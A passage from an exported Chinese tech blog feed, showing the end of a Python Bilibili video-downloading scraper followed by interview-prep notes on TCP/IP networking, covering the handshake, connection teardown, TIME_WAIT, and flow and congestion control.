headers=headers).content</span><br><span class="line"></span><br><span class="line">        name = link[2] + &#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">        with open(f&#x27;&#123;name&#125;.mp4&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">            f.write(video)</span><br><span class="line">        with open(f&#x27;&#123;name&#125;.mp3&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">            f.write(audio)</span><br><span class="line"></span><br><span class="line">        # 合并</span><br><span class="line">        print(&#x27;合并视频&#x27;)</span><br><span class="line"></span><br><span class="line">        ffmpeg_tools.ffmpeg_merge_video_audio(f&#x27;&#123;name&#125;.mp4&#x27;, f&#x27;&#123;name&#125;.mp3&#x27;, f&#x27;&#123;link[2]&#125;.mp4&#x27;)</span><br><span class="line">        print(&#x27;*&#x27; * 50)</span><br><span class="line">        print(&#x27;下载成功&#x27;)</span><br><span class="line">        print()</span><br><span class="line"></span><br><span class="line">        # 删除之前的文件</span><br><span class="line">        os.remove(f&#x27;&#123;name&#125;.mp4&#x27;)</span><br><span class="line">        os.remove(f&#x27;&#123;name&#125;.mp3&#x27;)</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        html = self.get_page()</span><br><span class="line">        print(&#x27;获取到源码&#x27;)</span><br><span class="line">        link = self.analysis(html)</span><br><span class="line">        print(&#x27;获取到链接&#x27;, link)</span><br><span class="line">        self.save(link)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 番剧/电影爬取</span><br><span class="line">class Drama(Video):</span><br><span class="line">    def analysis(self, html):</span><br><span class="line">        tree = etree.HTML(html)</span><br><span class="line">        # 视频名称</span><br><span class="line">        name = tree.xpath(&#x27;//title/text()&#x27;)[0]</span><br><span class="line">        # 视频链接列表</span><br><span class="line">        video_list = tree.xpath(&#x27;//script[contains(text(), &quot;window.__playinfo__&quot;)]/text()&#x27;)[0]</span><br><span class="line">        video = re.findall(r&#x27;&quot;video&quot;:\[.*?&quot;backupUrl&quot;:\[&quot;(.*?)&quot;&#x27;, video_list)[0]</span><br><span class="line">        audio = re.findall(r&#x27;&quot;audio&quot;:\[.*?&quot;backupUrl&quot;:\[&quot;(.*?)&quot;&#x27;, video_list)[0]</span><br><span class="line">        return video, audio, name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def error(url):</span><br><span class="line">    print(&#x27;自动识别错误，请手动选择&#x27;)</span><br><span class="line">    flash = True</span><br><span class="line">    while flash:</span><br><span class="line">        choose = input(&#x27;1.视频, 2.番剧或电影\n&#x27;)</span><br><span class="line">        if choose == &#x27;1&#x27;:</span><br><span class="line">            print(&#x27;视频&#x27;)</span><br><span class="line">            p = Video(url)</span><br><span class="line">            p.run()</span><br><span class="line">        elif choose == &#x27;2&#x27;:</span><br><span class="line">            print(&#x27;番剧或电影&#x27;)</span><br><span class="line">            d = Drama(url)</span><br><span class="line">            d.run()</span><br><span class="line">        else:</span><br><span class="line">            print(&#x27;输入格式有误，请重新输入&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url_list = [</span><br><span class="line">        &#x27;https://www.bilibili.com/bangumi/play/ss42077?theme=movie&#x27;</span><br><span class="line">        ]</span><br><span class="line">    for i in url_list:</span><br><span class="line">        if &#x27;video&#x27; in i:</span><br><span class="line">            p = Video(i)</span><br><span class="line">            p.run()</span><br><span class="line">        elif &#x27;play&#x27; in i:</span><br><span class="line">            d = Drama(i)</span><br><span class="line">            d.run()</span><br><span class="line">        else:</span><br><span class="line">            error(i)</span><br></pre></td></tr></table></figure><div>  点击下载博客:  <div style="display: flex;justify-content: center;">      <a href="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/md/B%E7%AB%99%E8%A7%86%E9%A2%91%E9%87%8D%E6%9E%84%E5%B9%B6%E5%8A%A0%E5%BC%BA-B%E7%AB%99%E7%88%AC%E8%99%AB2-0%E7%89%88%E6%9C%AC.md">    <i class="fa fa-download fa-2x" aria-hidden="true"></i>    </a>  </div></div>]]></content>
      
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面经整理</title>
      <link href="/2022/08/26/%E9%9D%A2%E7%BB%8F%E6%95%B4%E7%90%86/"/>
      <url>/2022/08/26/%E9%9D%A2%E7%BB%8F%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="一、计算机网络"><a href="#一、计算机网络" class="headerlink" title="一、计算机网络"></a>一、计算机网络</h2><h3 id="0-OSI七层模型和TCP-x2F-IP四层模型是什么？都有什么协议？"><a href="#0-OSI七层模型和TCP-x2F-IP四层模型是什么？都有什么协议？" class="headerlink" title="0 - OSI七层模型和TCP&#x2F;IP四层模型是什么？都有什么协议？"></a>0 - OSI七层模型和TCP&#x2F;IP四层模型是什么？都有什么协议？</h3><p><strong>OSI 七层模型及其包含的协议如下:</strong></p><ul><li><strong>物理层: <strong>通过媒介传输比特,确定机械及电气规范，</strong>传输单位为bit</strong>，主要包括的协议为：<strong>IEE802.3 CLOCK RJ45</strong></li><li><strong>数据链路层:</strong> 将比特组装成帧和点到点的传递,<strong>传输单位为帧</strong>,主要包括的协议为<strong>MAC VLAN PPP</strong></li><li><strong>网络层：</strong>负责数据包从源到宿的传递和网际互连，<strong>传输单位为包</strong>,主要包括的协议为<strong>IP ARP ICMP</strong></li><li><strong>传输层：</strong>提供端到端的可靠报文传递和错误恢复，<strong>传输单位为报文</strong>,主要包括的协议为<strong>TCP UDP</strong></li><li><strong>会话层：</strong>建立、管理和终止会话，<strong>传输单位为SPDU</strong>，主要包括的协议为<strong>RPC NFS</strong></li><li><strong>表示层: <strong>对数据进行翻译、加密和压缩,<strong>传输单位为PPDU</strong>，主要包括的协议为</strong>JPEG ASII</strong></li><li>**应用层: **允许访问OSI 环境的手段,<strong>传输单位为APDU</strong>，主要包括的协议为 <strong>FTP HTTP DNS</strong></li></ul><p><strong>TCP&#x2F;IP 4 层模型包括：</strongp><ul><li>网络接口层：MAC VLAN</li><li>网络层: IP ARP ICMP</li><li>传输层: TCP UDP</li><li>应用层: HTTP DNS SMTP</li><li><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/1.png" alt="1"></li></ul><h3 id="1-TCP是怎样建立连接的？三次握手"><a href="#1-TCP是怎样建立连接的？三次握手" class="headerlink" title="1 - TCP是怎样建立连接的？三次握手"></a>1 - TCP是怎样建立连接的？三次握手</h3><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/2.png"></p><h4 id="1-0-三次握手"><a href="#1-0-三次握手" class="headerlink" title="1.0 三次握手"></a>1.0 三次握手</h4><p>最初两端的TCP进程都处于<strong>CLOSE（关闭）状态</strong>，开始建立连接，服务器Server的TCP服务器进程先创建<strong>传输控制块TCB（Transmission Control Block）</strong>，准备接受客户端进程的连接请求。此时服务器进程处于<strong>LISTEN（收听）</strong>状态。客户端Client的TCP客户端进程也是首先创建TCB，在决定建立TCP连接时，向服务器Server发送连接请求（从而开始三次握手）：</p><ol><li>客户端向服务器发送连接请求报文段，将首部中的同步位<strong>SYN置为1</strong>，同时选择一个初始序号ISN(j)。此时客户端进入<strong>SYN-SENT（同步已发送） 状态</strong>。<ul><li>SYN报文段（即SYN&#x3D;1的报文段）不能携带数据，但要消耗一个序号</li></ul></li><li>服务器收到客户端的SYN报文后，会发送自己的SYN报文，在报文段中把<strong>SYN和ACK都置为1</strong>，同时也为自己选择一个初始序号ISN(k)，<strong>把客户端的ISN+1（j+1）作为ACK的值</strong>，表示自己已经收到了客户端的ISN。这时TCP服务器进行进入<strong>SYN-RCVD（同步收到）状态</strong>。<ul><li>同理，此报文段也不能携带数据。</li></ul></li><li>客户端收到服务器的SYN报文后，还要向服务器发送 一个ACK报文，确认报文段中的<strong>ACK&#x3D;1</strong>，也是一样把服务器的ISN+1（k+1）作为ACK的值，表示已经收到了服务端的SYN报文，这时TCP连接已经建立，客户端进入<strong>ESTABLISHED（已建立连接）状态</strong>。当服务器收到客户端的确认后，也进入<strong>ESTABLISHED（已建立连接）状态</strong>。<ul><li>TCP标准规定，ACK报文段可以携带数据，但如果不携带数据则不消耗序号</li></ul></li></ol><p>其中服务器给客户端发送的报文也可以拆成两个报文段，可以先发一个确认报文段（<strong>ACK&#x3D;1，ack&#x3D;j+1</strong>），再发送一个同步报文段（<strong>SYN&#x3D;1，seq&#x3D;k</strong>）。这样就变成了四次报文握手，但效果一样</p><h4 id="1-1-ISN是固定的吗"><a href="#1-1-ISN是固定的吗" class="headerlink" title="1.1 ISN是固定的吗"></a>1.1 ISN是固定的吗</h4><p>三次握手的一个重要功能是客户端和服务端交换ISN（Intial Sequence Number），以便让对方知道接下来接受数据的时候如何按序列号组装数据</p><p>如果ISN是固定的，攻击者很容易猜出后续的确认号，因此<strong>ISN是动态生成的</strong></p><h4 id="1-2-什么是半连接队列？"><a href="#1-2-什么是半连接队列？" class="headerlink" title="1.2 什么是半连接队列？"></a>1.2 什么是半连接队列？</h4><p>服务器第一次接收到客户端的SYN之后，就会处于SYN_RCVD状态，此时双方还没有完全建立其连接，服务器会把此种状态下请求连接放在一个队列里，即半连接队列。</p><p>对应的是全连接队列，就是已经完成三次握手，建立起连接的就会放在全连接队列里。如果队列满了就有可能出现丢包的现象</p><h4 id="1-3-三次握手过程中可以携带数据吗？"><a href="#1-3-三次握手过程中可以携带数据吗？" class="headerlink" title="1.3 三次握手过程中可以携带数据吗？"></a>1.3 三次握手过程中可以携带数据吗？</h4><p>TCP规定，SYN报文段（即SYN&#x3D;1的报文段）不能携带数据，但要消耗一个序号。所以<strong>第一次、第二次握手不可以携带数据，但第三次可以携带数据</strong></p><p><strong>如果SYN报文段可以携带数据，攻击者可以在第一次握手中的SYN报文中放入大量数据，因为攻击者根本不理会服务器的接收、发送能力是否正常，疯狂发送SYN报文，这会让服务器花费大量时间和内存空间来接收这些空报文。服务器更容易受到攻击。</strong></p><p>对于第三次握手，此时客户端已经处于established状态，对于客户端来说，已经建立起了连接，并且也知道服务器的接收、发送能力是正常的，所以可以携带数据。</p><h3 id="2-TCP是怎样断开连接的？四次挥手"><a href="#2-TCP是怎样断开连接的？四次挥手" class="headerlink" title="2 - TCP是怎样断开连接的？四次挥手"></a>2 - TCP是怎样断开连接的？四次挥手</h3><h4 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h4><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20210921105809482.png" alt="img"></p><p>数据传输结束后，通信的双方都可释放连接，现在客户端和服务端都处于<strong>ESTABLISHED（已建立连接）状态</strong>。</p><ol><li><p>第一次挥手：客户端向服务器发送一个FIN报文，首部的FIN&#x3D;1，同时报文给自己指定一个序号（m），此时客户端进入<strong>FIN_WAIT_1 （终止等待1）状态</strong>，但客户端依然可以接收服务器发送来的数据。</p><ul><li>TCP规定，FIN报文段即使不携带数据，也要消耗一个序号。</li></ul></li><li><p>第二次挥手：服务端收到了客户端的FIN报文，会发送ACK报文进行确认，把收到报文的序列号的值+1（m+1）作为ACK报文的序列号的值，表明已经收到了客户端的报文，服务器进入<strong>CLOSE-WAIT（关闭等待）状态</strong></p><ul><li>TCP服务器进程这时应通知高层应用程序，客户端到服务端这个方向的连接就释放了，此时TCP连接处于<strong>半关闭（HALF-CLOSE）状态</strong>，即客户端已经没有数据要发送了，但服务器若发送数据，客户端仍要接收。客户端收到服务端的确认后，进入<strong>FIN-WAIT-2（终止等待2）状态</strong>。等待服务端发出的连接释放报文段。</li></ul></li><li><p>第三次挥手：当服务器没有数据要发送了，也想要断开连接，会给客户端发送FIN报文，且指定一个序列号（n），服务器进入了<strong>LAST-ACK（最后确认）状态</strong>。</p></li><li><p>第四次挥手：客户端收到FIN之后，一样会发送一个ACK报文作为应答，且把服务端的序号+1（n+1）作为自己ACK报文的序号。然后进入<strong>TIME-WAIT（时间等待）</strong>状态，等待<strong>2MSL</strong>（<strong>MSL：报文段最大生存时间</strong>），然后关闭连接。</p></li></ol><h4 id="为什么TIME-WAIT状态-必须等待2MSL的时间呢？"><a href="#为什么TIME-WAIT状态-必须等待2MSL的时间呢？" class="headerlink" title="为什么TIME-WAIT状态 必须等待2MSL的时间呢？"></a>为什么TIME-WAIT状态 必须等待2MSL的时间呢？</h4><ol><li><strong>为了保证A发送的最后一个ACK报文段能够到达B。</strong>这个ACK报文段有可能丢失，因而使处在LAST_ACK状态的B收不到对已发送FIN+ACK报文段的确认。B会超时重传这个FIN+ACK报文段，而A就能在2MSL时候内（超时+1MSL传输）收到这个重传的FIN+ACK报文段。接着A重传一次确认，重新启动2MSL计时器，最后A和B都正常进入CLOSED状态。如果A在TIME-WAIT状态不等待一段时间，而是在发送完ACK报文段后立即释放连接，那么就无法收到B重传的FIN+ACK报文段，因而也不会再发送一次确认报文段，这样B就无法按照正常流程进入CLOSED状态。</li><li><strong>防止已失效的连接请求报文段出现在本连接中。</strong>A在发送完最后一个ACK报文段后，再经过2MSL，就可以使本连接持续的时间内所产生的所有报文段在网络中消失。这样就可以使下一个连接中不会出现这种旧的连接请求报文段。</li></ol><p><strong>2MSL 意义:</strong></p><ul><li>保证最后一次握手报文能到服务器，能进行超时重传。</li><li>2MSL 后，这次连接的所有报文都会消失，不会影响下一次连接。</li></ul><h4 id="TIME-WAIT的作用"><a href="#TIME-WAIT的作用" class="headerlink" title="TIME_WAIT的作用"></a>TIME_WAIT的作用</h4><p>大多数 BSD 派生的系统一样，Linux 系统里有一个硬编码的字段，名称为TCP_TIMEWAIT_LEN，其值为 60 秒。也就是说，Linux 系统停留在 TIME_WAIT 的时间为固定的 60 秒。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> TCP_TIMEWAIT_LEN (60*HZ) </span></span><br><span class="line"><span class="comment">/* how long to wait to destroy TIME-WAIT state, about 60 seconds  */</span></span><br></pre></td></tr></table></figure><p><strong>只有发起连接终止的一方会进入 TIME_WAIT 状态。</strong></p><p>TIME_WAIT可以：</p><ul><li><strong>确保最后的 ACK 能让被动关闭方接收，从而帮助其正常关闭。</strong><ul><li>TCP 假设报文会出错，需要重传。如果客户端的ACK 报文没有传输成功，那么服务器就会重新发送 FIN 报文。如果客户端 没有维护 TIME_WAIT 状态，而直接进入 CLOSED 状态，它就失去了当前状态的上下文，只能回复一个 RST 操作，从而导致被动关闭方出现错误。现在客户端知道自己处于 TIME_WAIT 的状态，就可以在接收到 FIN 报文之后，重新发出一个 ACK 报文，使得服务器可以进入正常的 CLOSED 状态。</li></ul></li><li><strong>为了让旧连接的重复分节在网络中自然消失。</strong><ul><li>2MSL 的时间是从客户端接收到 FIN 后发送 ACK 开始计时的；如果在 TIME_WAIT 时间内，因为客户端的 ACK 没有传输到服务器，客户端又接收到了服务器重发的 FIN 报文，那么 2MSL 时间将重新计时。道理很简单，因为 2MSL 的时间，目的是为了让旧连接的所有报文都能自然消亡，现在客户端重新发送了 ACK 报文，自然需要重新计时，以便防止这个 ACK 报文对新可能的连接化身造成干扰。</li><li>如果迷走报文到达时，发现 TCP 连接四元组（源 IP，源端口，目的 IP，目的端口）所代表的连接不复存在，那么这个报文会被丢弃。</li><li>经过 2MSL 这个时间，足以让两个方向上的分组都被丢弃，使得原来连接的分组在网络中都自然消失，再出现的分组一定都是新化身所产生的。</li></ul></li></ul><h4 id="TIME-WAIT的危害？"><a href="#TIME-WAIT的危害？" class="headerlink" title="TIME_WAIT的危害？"></a>TIME_WAIT的危害？</h4><ul><li>第一是内存资源占用，但不是很严重，基本可以忽略。</li><li>第二是对端口资源的占用，一个 TCP 连接至少消耗一个本地端口。端口资源也是有限的，一般可以开启的端口为 32768～61000 ，也可以通过net.ipv4.ip_local_port_range指定，如果 TIME_WAIT 状态过多，会导致无法创建新连接。</li></ul><h4 id="如何优化TIME-WAIT？"><a href="#如何优化TIME-WAIT？" class="headerlink" title="如何优化TIME_WAIT？"></a>如何优化TIME_WAIT？</h4><p><strong>net.ipv4.tcp_max_tw_buckets：</strong></p><p>一个暴力的方法是通过 sysctl 命令，将系统值调小。这个值默认为 18000，当系统中处于 TIME_WAIT 的连接一旦超过这个值时，系统就会将所有的 TIME_WAIT 连接状态重置，并且只打印出警告信息。这个方法过于暴力，而且治标不治本，带来的问题远比解决的问题多，不推荐使用。</p><p><strong>调低 TCP_TIMEWAIT_LEN：</strong></p><p>重新编译系统这个方法是一个不错的方法，缺点是需要“一点”内核方面的知识，能够重新编译内核。</p><p><strong>net.ipv4.tcp_tw_reuse：更安全的设置：</strong></p><p>Linux 系统对于net.ipv4.tcp_tw_reuse的解释如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Allow to reuse TIME-WAIT sockets for new connections when it is safe from protocol viewpoint. Default value is 0.It should not be changed without advice/request of technical experts.</span><br></pre></td></tr></table></figure><p>即从协议角度理解如果是安全可控的，可以复用处于 TIME_WAIT 的套接字为新的连接所用。</p><p>那么什么是协议角度理解的安全可控呢？主要有两点：</p><ul><li>只适用于连接发起方（C&#x2F;S 模型中的客户端）；</li><li>对应的 TIME_WAIT 状态的连接创建时间超过 1 秒才可以被复用。<ul><li>使用这个选项，还有一个前提，需要打开对 TCP 时间戳的支持，即net.ipv4.tcp_timestamps&#x3D;1（默认即为 1）。</li></ul></li></ul><p>TCP 协议也在与时俱进，RFC 1323 中实现了 TCP 拓展规范，以便保证 TCP 的高可用，并引入了新的 TCP 选项，两个 4 字节的时间戳字段，用于记录 TCP 发送方的当前时间戳和从对端接收到的最新时间戳。由于引入了时间戳，前面提到的 2MSL 问题就不复存在了，因为重复的数据包会因为时间戳过期被自然丢弃。</p><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p><strong>TIME_WAIT的作用：</strong></p><p>1） 确保对方能够正确收到最后的ACK，帮助其关闭；</p><p>2） 防迷走报文对程序带来的影响。</p><p><strong>TIME_WAIT的危害：</strong></p><p>1） 占用内存；</p><p>2） 占用端口。</p><h3 id="3-TCP三次握手和四次挥手的原因"><a href="#3-TCP三次握手和四次挥手的原因" class="headerlink" title="3 - TCP三次握手和四次挥手的原因"></a>3 - TCP三次握手和四次挥手的原因</h3><h4 id="三次握手的原因："><a href="#三次握手的原因：" class="headerlink" title="三次握手的原因："></a>三次握手的原因：</h4><p>三次握手可以<strong>防止已经失效的连接请求报文突然又传输到服务器端导致的服务器资源浪费。</strong></p><p>例如，客户端先发送了一个SYN，但是由于网络阻塞，该SYN 数据包在某个节点长期滞留。然后客户端又重传SYN 数据包并正确建立TCP 连接，然后传输完数据后关闭该连接。该连接释放后失效的SYN 数据包才到达服务器端。在二次握手的前提下，服务器端会认为这是客户端发起的又一次请求，然后发送SYN ，并且在服务器端创建socket 套接字，一直等待客户端发送数据。但是由于客户端并没有发起新的请求，所以会丢弃服务端的SYN 。此时服务器会一直等待客户端发送数据从而造成资源浪费。</p><h4 id="四次挥手的原因："><a href="#四次挥手的原因：" class="headerlink" title="四次挥手的原因："></a>四次挥手的原因：</h4><p>因为当处于LISTEN状态的服务器端收到来自客户端的SYN报文(客户端希望新建一个TCP连接)时，它可以把ACK(确认应答)和SYN(同步序号)放在同一个报文里来发送给客户端。<strong>但在关闭TCP连接时，当收到对方的FIN报文时，对方仅仅表示对方已经没有数据发送给你了，但是自身可能还有数据需要发送给对方</strong>，则等你发送完剩余的数据给对方之后，再发送FIN报文给对方来表示你数据已经发送完毕，并请求关闭连接，所以通常情况下，这里的ACK报文和FIN报文都是分开发送的。</p><h3 id="4-请问tcp-握手为什么两次不可以？为什么不用四次？"><a href="#4-请问tcp-握手为什么两次不可以？为什么不用四次？" class="headerlink" title="4 - 请问tcp 握手为什么两次不可以？为什么不用四次？"></a>4 - 请问tcp 握手为什么两次不可以？为什么不用四次？</h3><h4 id="两次不可以："><a href="#两次不可以：" class="headerlink" title="两次不可以："></a>两次不可以：</h4><ul><li>TCP 是全双工通信，两次握手只能确定单向数据链路是可以通信的，并不能保证反向的通信正常</li></ul><p><strong>详细解释：</strong></p><p>这个问题的本质是：在信道不可靠的情况下, 通信双发需要就某个问题达成一致. 需要几次通信？</p><p>对于此问题，无论在消息中包含什么信息, 三次通信是理论上的最小值. 所以三次握手不是TCP本身的要求, 而是为了满足**”在不可靠信道上可靠地传输信息”**这一需求所导致的</p><p>具体来说：</p><ul><li>TCP连接的双方要确保各自的收发消息的能力都是正常的。</li><li>客户端第一次发送握手消息到服务端，服务端接收到握手消息后把ack和自己的syn一同发送给客户端，这是第二次握手，当客户端接收到服务端发送来的第二次握手消息后，客户端可以确认“服务端的收发能力OK，客户端的收发能力OK”，但是服务端只能确认“客户端的发送OK，服务端的接收OK”，</li><li>所以还需要第三次握手，客户端收到服务端的第二次握手消息后，发起第三次握手消息，服务端收到客户端发送的第三次握手消息后，就能够确定“服务端的发送OK，客户端的接收OK”，</li><li>至此，客户端和服务端都能够确认自己和对方的收发能力OK，TCP连接建立完成。</li></ul><h4 id="不用四次："><a href="#不用四次：" class="headerlink" title="不用四次："></a>不用四次：</h4><ul><li>本来握手应该和挥手一样都是需要确认两个方向都能联通的，本来模型应该是：<ul><li><ol><li>客户端发送syn0 给服务器</li></ol></li><li><ol start="2"><li>服务器收到syn0，回复ack(syn0+1)</li></ol></li><li><ol start="3"><li>服务器发送syn1</li></ol></li><li><ol start="4"><li>客户端收到syn1，回复ack(syn1+1)</li></ol></li></ul></li><li><strong>因为TCP是全双工的，上边的四步确认了数据在两个方向上都是可以正确到达的，但是2，3 步没有没有上下的联系，可以将其合并，加快握手效率，所有就变成了3 步握手。</strong></li></ul><h3 id="5-TCP协议是如何保证可靠传输的？"><a href="#5-TCP协议是如何保证可靠传输的？" class="headerlink" title="5 - TCP协议是如何保证可靠传输的？"></a>5 - TCP协议是如何保证可靠传输的？</h3><ul><li>（1）<strong>数据包校验：</strong>目的是检测数据在传输过程中的是否发生变化，若校验包有错，则丢弃报文段并且不给出响应，这时TCP发送端超时后重发数据</li><li>（2）<strong>对失序数据包重排序：</strong>既然TCP报文段作为IP数据包来传输，而IP数据报的到达可能会失序，因此TCP报文段的到达也可能失序。TCP将对失序数据重新排序，然后才交给应用层</li><li>（3）<strong>丢弃重复数据</strong></li><li>（4）<strong>应答机制：</strong>当TCP一端收到另一端的数据，它将发送一个确认。这个确认不是立即发送，通常会将推迟几分之一秒；</li><li>（5）<strong>超时重发：</strong>当TCP发出一个段，会启动一个定时器，等待目的端确认收到这个报文段，如果不能及时收到一个确认，将重发这个报文段</li><li>（6）<strong>流量控制：</strong>TCP连接的每一方都有固定大小的缓冲空间。TCP的接收端只允许另一端发送接收端缓冲区所能接纳的数据。TCP使用的流量控制协议是可变大小的滑动窗口协议。</li><li>（7）<strong>拥塞控制算法（慢开始、拥塞避免、快重传、快恢复）</strong></li></ul><h3 id="6-TCP可靠性原理？"><a href="#6-TCP可靠性原理？" class="headerlink" title="6 - TCP可靠性原理？"></a>6 - TCP可靠性原理？</h3><p>可靠传输有如下两个特点：</p><ul><li>传输信道无差错，保证传输数据正确</li><li>不管发送方以多快的速度发送数据，接收方总是来得及处理收到的数据<ul><li>首先，采用三次握手建立TCP连接，四次握手释放TCP连接，保证了传输信道是可靠的</li><li>其次，TCP采用了连续ARQ协议（回退N（Go-back-N），超时自动重传）来保证数据传输的正确性，使用滑动窗口协议来保证接收方能够及时处理所接收到的数据，进行流量控制</li><li>最后，TCP使用慢开始、拥塞避免、快重传、快恢复来进行拥塞控制，避免网络拥塞</li></ul></li></ul><h3 id="7-谈谈你对流量控制的理解？"><a href="#7-谈谈你对流量控制的理解？" class="headerlink" title="7 - 谈谈你对流量控制的理解？"></a>7 - 谈谈你对流量控制的理解？</h3><p>TCP利用窗口实现流量控制。流量控制是为了控制发送方发送速率，保证接收方来得及接收。接收方发送的确认报文中的窗口字段可以同来控制发送方窗口的大小，从而影响发送方的发送速率。将窗口字段设置为0，则发送方不能发送数据。</p><h3 id="8-谈谈你对TCP滑动窗口的了解？"><a href="#8-谈谈你对TCP滑动窗口的了解？" class="headerlink" title="8 - 谈谈你对TCP滑动窗口的了解？"></a>8 - 谈谈你对TCP滑动窗口的了解？</h3><ul><li><p>TCP利用滑动窗口实现流量控制。滑动窗口（Sliding Window）是一种流量控制技术。在早期的网络通信中，通信双方不会考虑网络的拥挤情况而直接发送数据。由于双方不知道网络拥塞状况，同时发送数据，导致中间节点阻塞丢包，谁也发不了数据，所有就有了滑动窗口机制来解决此问题</p></li><li><p>TCP中采用滑动窗口来进行传输控制，滑动窗口的大小意味着接收方还有多大的缓冲区可用于接收数据；发送方可以通过滑动窗口的大小来确定应该发送多少字节的数据。</p></li><li><p>当滑动窗口为0时，发送方一般不能再发送数据报，有两种情况除外：</p><ul><li><p>一种情况是可以发送紧急数据，例如，允许用户终止在远端机上的运行进程。</p></li><li><p>一种情况是发送方可以发送一个1字节的数据报来通知接收方重新声明它希望接收的下一个字节及发送方的滑动窗口大小。</p></li></ul></li></ul><h3 id="9-谈下对TCP拥塞控制的理解？"><a href="#9-谈下对TCP拥塞控制的理解？" class="headerlink" title="9 - 谈下对TCP拥塞控制的理解？"></a>9 - 谈下对TCP拥塞控制的理解？</h3><ul><li><p>拥塞控制和流量控制不同：</p><ul><li>拥塞控制是一个全局性的过程</li><li>流量控制是点对点通信量的控制</li></ul></li><li><p>在某段时间，若对网络中某一资源的需求超过了该资源所能提供的可用部分，网络的性能就会变差，这种情况就叫拥塞。</p></li><li><p>拥塞控制就是为了防止过多的数据注入到网络中，这样就使网络中的路由器或链路不致于过载。拥塞避免所要做的都有一个前提，就是网络能够承受现有的网络负载，拥塞控制是一个全局性的过程，涉及到所有的主机、路由器，以及与降低网络传输性能有关的所有因素。相反，流量控制往往是点对点的通信量的控制，是个端到端的问题。流量控制所要做的就是抑制发送端发送数据的速率，以便于接收端来得及接收。</p></li></ul><p>为了进行拥塞控制，TCP发送方要维持一个拥塞窗口（cwnd）。拥塞窗口的大小取决于网络的拥塞程度，并且动态变化。发送方让自己的发送窗口取拥塞窗口和接收方接收窗口中较小的一个。 <strong>swnd &#x3D; min(cwnd, rwnd)</strong></p><p><strong>TCP的拥塞控制采用了四种算法 （慢开始、拥塞避免、快重传、快恢复）</strong>，在网络层也可以使路由器采用适当的分组丢弃策略（如：主动队列管理 AQM），以减少网络拥塞的发生。</p><ul><li><strong>慢启动：</strong>定义拥塞窗口，一开始将该窗口大小设为<code>1</code>，之后每次收到确认应答（经过一个<code>RTT</code>），将拥塞窗口大小乘2。如果一次性把大量数据注入网络，那么可能会引起网络阻塞，较好的方法是先探测一下，即由小到大逐渐扩大发送窗口。</li><li><strong>拥塞避免：</strong>设置慢启动阈值，一般开始都设为<code>65536</code>。拥塞避免是指<strong>当拥塞窗口大小达到这个阈值，拥塞窗口的值不再指数上升，而是加法增加</strong>（每次确认应答&#x2F;每个RTT，拥塞窗口大小<code>+1</code>），以此来避免拥塞。</li><li>将报文段的超时重传看做拥塞，则一旦发生超时重传，需要先<strong>将阈值设为当前窗口大小的一半</strong>，并且将窗口大小设为初值1，然后重新进入慢启动过程。为了避免这种情况，从而有了快重传算法。</li><li><strong>快重传：</strong>当接收方收到<code>M1</code>和<code>M2</code>后，都分别及时发送确认，但是如果接收方没有收到<code>M3</code>，却收到了<code>M4</code>、<code>M5</code>和<code>M6</code>，但接收方收到后也仍然要再次分别发出对<code>M2</code>的重复确认，这样发送方就收到了4个对<code>M2</code>的确认，其中后三个是重复的确认。<strong>快重传算法规定，发送方只要一连收到3个重复确认，就知道接收方没有收到<code>M3</code>因而应当立即进行快重传，这样就不会出现超时。</strong></li><li><strong>快恢复：</strong>当发送方知道只是丢失了个别的报文段，不会启动慢开始算法，而是执行快恢复算法。将阈值设为当前窗口大小的一半，同时设置拥塞窗口为阈值的大小，然后执行拥塞避免算法。</li></ul><p>通过拥塞控制算法，在TCP 通信时，网络吞吐量呈现逐渐的上升，并且随着拥堵来降低吞吐量，再进入慢慢上升的过程，网络不会轻易的发生瘫痪。</p><h3 id="10-TCP拥塞控制如何实现的？"><a href="#10-TCP拥塞控制如何实现的？" class="headerlink" title="10 - TCP拥塞控制如何实现的？"></a>10 - TCP拥塞控制如何实现的？</h3><p>TCP发送方要维持一个拥塞窗口（cwnd），而发送窗口的值是 <strong>swnd &#x3D; min(cwnd, rwnd)，</strong>也就是拥塞窗口和接收窗口中的最小值。</p><p>拥塞控制是防止过多的数据注入网络，使得网络中的路由器或者链路过载。流量控制是点对点的通信量控制，而拥塞控制是全局的网络流量整体性的控制。<strong>发送双方都有一个拥塞窗口— cwnd。</strong></p><p><strong>（1）慢开始：</strong></p><ul><li>最开始发送方的拥塞窗口 cwnd 为1，由小到大逐渐增大发送窗口和拥塞窗口。每经过一个传输轮次，拥塞窗口cwnd 加倍。当cwnd 超过慢开始门限，则使用拥塞避免算法，避免cwnd 增长过大。</li></ul><p><strong>（2）拥塞避免：</strong></p><ul><li>每经过一个往返时间RTT，拥塞窗口cwnd 就增长1。</li><li>在慢开始和拥塞避免的过程中，一旦发现网络拥塞，就把慢开始门限设为当前值的一半，并且重新设置拥塞窗口 cwnd 为1，重新慢启动。（乘法减小，加法增大）</li></ul><p><strong>（3）快重传：</strong></p><ul><li>接收方每次收到一个失序的报文段后就立即发出重复确认，发送方只要连续收到三个重复确认就立即重传（尽早重传未被确认的报文段）。</li></ul><p><strong>（4）快恢复：</strong></p><ul><li>当发送方连续收到了三个重复确认，就乘法减半（慢开始门限减半），将当前的拥塞窗口 cwnd 